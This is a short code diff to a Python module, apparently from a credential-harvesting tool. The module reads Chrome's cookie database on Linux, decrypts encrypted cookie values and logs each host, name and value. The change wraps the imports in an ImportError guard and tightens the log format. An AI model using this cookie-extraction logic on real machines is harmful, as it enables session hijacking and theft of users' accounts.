@@ -1,9 +1,12 @@
 # coding: utf-8
 
-import os
-import sqlite3
-from Crypto.Cipher import AES
-from hashlib import pbkdf2_hmac
+try:
+	import os
+	import sqlite3
+	from Crypto.Cipher import AES
+	from hashlib import pbkdf2_hmac
+except ImportError:
+	pass
 
 from modules.linux.chrome.chrome_module import ChromeModule
 
@@ -45,7 +48,7 @@ class ChromeCookie(ChromeModule):
 				cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
 
 				for host_key, name, value, encrypted_value in cursor.fetchall():
-					self.log(host_key + ', ' + name + ', ' + str(value if value else self.decrypt(encrypted_value, enc_key)))
+					self.log(host_key + ',' + name + ',' + str(value if value else self.decrypt(encrypted_value, enc_key)))
 
 		return True
 
